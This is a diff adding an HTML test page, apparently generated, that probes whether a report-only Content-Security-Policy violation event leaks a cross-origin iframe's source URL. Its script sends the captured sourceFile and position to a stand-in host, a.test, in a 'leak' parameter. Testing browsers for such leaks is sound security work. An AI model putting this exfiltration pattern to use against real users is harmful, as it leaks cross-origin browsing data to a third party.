@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Security-Policy-Report-Only" content="frame-src 'self'">
+  <script>
+    document.addEventListener("securitypolicyviolation", function(e) {
+      var report = `securitypolicyviolation_event.sourceFile=${e.sourceFile}; ` +
+                   `securitypolicyviolation_event.lineNumber=${e.lineNumber}; ` +
+                   `securitypolicyviolation_event.columnNumber=${e.columnNumber}`;
+      fetch(`https://a.test/report/?leak=c633348&report=${encodeURIComponent(report)}`);
+    });
+  </script>
+</head>
+<body>
+  <iframe src="https://innocent.com/GenAI-12-Examples-4o/c633348/target"></iframe>
+</body>
+</html>
